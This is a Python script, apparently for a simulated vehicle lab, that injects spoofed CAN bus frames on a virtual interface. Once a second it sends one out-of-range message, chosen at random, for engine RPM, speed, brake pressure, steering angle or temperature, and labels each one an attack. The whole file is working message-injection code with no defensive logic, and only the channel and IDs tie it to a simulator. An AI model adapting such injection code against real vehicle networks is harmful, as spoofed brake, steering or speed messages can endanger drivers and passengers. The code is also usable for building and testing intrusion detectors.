import can
import time
import random

bus = can.interface.Bus(channel="vcan0", interface="socketcan")


def main():
    while True:
        attack = random.choice([
            "engine",
            "speed",
            "brake",
            "steering",
            "temperature",
        ])

        try:
            if attack == "engine":
                rpm = random.randint(7000, 9000)
                high = (rpm >> 8) & 0xFF
                low = rpm & 0xFF
                data = bytes([high, low] + [0] * 6)
                msg = can.Message(arbitration_id=0x101, data=data, is_extended_id=False)
                bus.send(msg)
                print(f"Attack → Engine RPM: {rpm}")

            elif attack == "speed":
                speed = random.randint(180, 250)
                data = bytes([speed] + [0] * 7)
                msg = can.Message(arbitration_id=0x102, data=data, is_extended_id=False)
                bus.send(msg)
                print(f"Attack → Speed: {speed} km/h")

            elif attack == "brake":
                brake = random.randint(101, 255)
                data = bytes([brake] + [0] * 7)
                msg = can.Message(arbitration_id=0x103, data=data, is_extended_id=False)
                bus.send(msg)
                print(f"Attack → Brake: {brake}%")

            elif attack == "steering":
                steering = random.randint(451, 900)
                high = (steering >> 8) & 0xFF
                low = steering & 0xFF
                data = bytes([high, low] + [0] * 6)
                msg = can.Message(arbitration_id=0x104, data=data, is_extended_id=False)
                bus.send(msg)
                print(f"Attack → Steering Encoded: {steering}")

            elif attack == "temperature":
                temp = random.randint(150, 220)
                data = bytes([temp] + [0] * 7)
                msg = can.Message(arbitration_id=0x105, data=data, is_extended_id=False)
                bus.send(msg)
                print(f"Attack → Temperature: {temp}°C")

        except can.CanError:
            print("Failed to send attack CAN message")

        time.sleep(1)


if __name__ == "__main__":
    main()
